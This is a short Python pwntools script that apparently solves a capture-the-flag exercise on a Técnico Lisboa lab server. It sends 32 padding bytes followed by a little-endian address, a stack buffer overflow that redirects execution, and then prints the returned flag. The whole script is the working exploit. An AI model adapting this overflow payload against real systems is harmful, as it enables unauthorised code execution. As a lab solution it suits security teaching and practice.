from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22153"


r = remote(SERVER,PORT)


print(f"Message server sent:\n{r.recvline().decode()}\n")

msg = (b"A"*0x20 + b"\xf1\x86\x04\x08")                     
                                                            
print(msg)                                                  
                                                            
r.sendline(msg)

print(f"Flag: {r.recvall().decode()}")

r.close()